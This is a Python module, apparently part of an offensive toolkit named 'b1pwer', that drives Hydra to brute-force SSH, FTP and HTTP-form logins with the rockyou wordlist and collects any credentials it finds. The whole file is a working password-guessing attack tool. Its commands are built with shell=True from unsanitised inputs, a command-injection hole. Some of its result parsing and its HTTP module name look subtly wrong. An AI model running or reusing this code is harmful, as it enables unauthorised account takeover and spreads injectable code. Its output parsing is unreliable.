"""
b1pwer.modules.brute - Credential brute forcing (Hydra integration)
"""
import subprocess
import os
from dataclasses import dataclass, field


@dataclass
class BruteResult:
    protocol: str
    target: str
    username: str
    password: str
    port: int
    time_found: str = ""


class BruteForcer:
    def __init__(self):
        self.available = subprocess.run(
            "which hydra > /dev/null 2>&1", shell=True
        ).returncode == 0
        self.wordlist = self._find_wordlist()

    def _find_wordlist(self) -> str:
        for path in [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/b1pwer/assets_rockyou.txt",
            os.path.expanduser("~/b1pwer/b1pwer-deb/usr/share/b1pwer/assets_rockyou.txt"),
        ]:
            if os.path.isfile(path):
                return path
        return "/usr/share/wordlists/rockyou.txt"

    def brute_ssh(self, target: str, port: int = 22,
                  userlist: str = "", passwordlist: str = "",
                  threads: int = 4, max_attempts: int = 100) -> list:
        if not self.available:
            return []
        userlist = userlist or "/usr/share/wordlists/users.txt"
        passwordlist = passwordlist or self.wordlist

        cmd = (
            f"hydra -L {userlist} -P {passwordlist} "
            f"-s {port} -t {threads} -m 4 "
            f"-I {max_attempts} ssh://{target} 2>&1"
        )
        return self._run_hydra(cmd, "ssh", target, port)

    def brute_ftp(self, target: str, port: int = 21,
                  userlist: str = "", passwordlist: str = "",
                  threads: int = 4) -> list:
        if not self.available:
            return []
        userlist = userlist or "/usr/share/wordlists/users.txt"
        passwordlist = passwordlist or self.wordlist

        cmd = (
            f"hydra -L {userlist} -P {passwordlist} "
            f"-s {port} -t {threads} ftp://{target} 2>&1"
        )
        return self._run_hydra(cmd, "ftp", target, port)

    def brute_http(self, target: str, port: int = 80,
                   path: str = "/login", userlist: str = "",
                   passwordlist: str = "", threads: int = 4) -> list:
        if not self.available:
            return []
        userlist = userlist or "/usr/share/wordlists/users.txt"
        passwordlist = passwordlist or self.wordlist

        cmd = (
            f"hydra -L {userlist} -P {passwordlist} "
            f"-s {port} -t {threads} "
            f"http-form-login://{target}{path} 2>&1"
        )
        return self._run_hydra(cmd, "http", target, port)

    def _run_hydra(self, cmd: str, protocol: str, target: str, port: int) -> list:
        results = []
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=300
            )
            for line in result.stdout.split("\n"):
                if "[DATA]" in line:
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p == "login:" and i + 2 < len(parts):
                            results.append(BruteResult(
                                protocol=protocol,
                                target=target,
                                username=parts[i+1],
                                password=parts[i+2],
                                port=port
                            ))
        except:
            pass
        return results
